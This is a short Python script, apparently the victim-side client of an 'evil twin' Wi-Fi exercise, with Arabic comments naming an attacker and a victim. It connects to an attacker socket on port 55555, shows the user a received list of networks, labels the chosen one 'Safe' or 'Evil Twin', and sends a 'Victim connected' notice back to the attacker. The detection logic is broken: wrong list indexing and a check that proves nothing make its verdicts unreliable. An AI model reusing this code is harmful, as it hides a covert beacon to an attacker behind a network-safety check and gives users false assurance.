import socket
import ast
import platform

def get_networks():
    attacker_ip = socket.gethostbyname(socket.gethostname())
    attacker_port = 55555  # تحديث مع منفذ المهاجم

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((attacker_ip, attacker_port))
        while True:
            data = client_socket.recv(1024)
            networks = ast.literal_eval(data.decode())

            print("List of Networks:")
            for i in range(0, len(networks), 2):
                ssid = networks[i]
                bssid = networks[i + 1]
                print(f"{i // 2 + 1}. SSID: {ssid}, BSSID: {bssid}")

            choice = input("Choose a network to check (enter the network number): ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(networks) // 2:
                    selected_ssid = networks[(choice - 1)]
                    is_safe = is_original(selected_ssid, networks)
                    network_type = "Safe" if is_safe else "Evil Twin"
                    print(f"The selected network '{selected_ssid}' is a {network_type} network.")
                    notify_attacker(attacker_ip, attacker_port)  # إعلام المهاجم
                    get_system_info()  # عرض معلومات النظام
                else:
                    print("Invalid choice.")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
    except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
        print(f"An error occurred: {e}")
        client_socket.close()


def is_original(selected_ssid, networks):
    # التحقق مما إذا كانت SSID المحددة موجودة في الشبكات الأصلية
    original_ssids = networks[::2]
    return selected_ssid in original_ssids


def get_system_info():
    system_name = platform.system()
    node_name = platform.node()
    processor_name = platform.processor()
    python_version = platform.python_version()

    print("System Information:")
    print(f"System: {system_name}")
    print(f"Node Name: {node_name}")
    print(f"Processor: {processor_name}")
    print(f"Python Version: {python_version}")


def notify_attacker(attacker_ip, attacker_port):
    # إرسال إشعار للمهاجم باتصال الضحية
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        attacker_socket.connect((attacker_ip, attacker_port))
        attacker_socket.sendall(b"Victim connected")
    except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
        print(f"An error occurred while notifying the attacker: {e}")
    finally:
        attacker_socket.close()


if __name__ == "__main__":
    get_networks()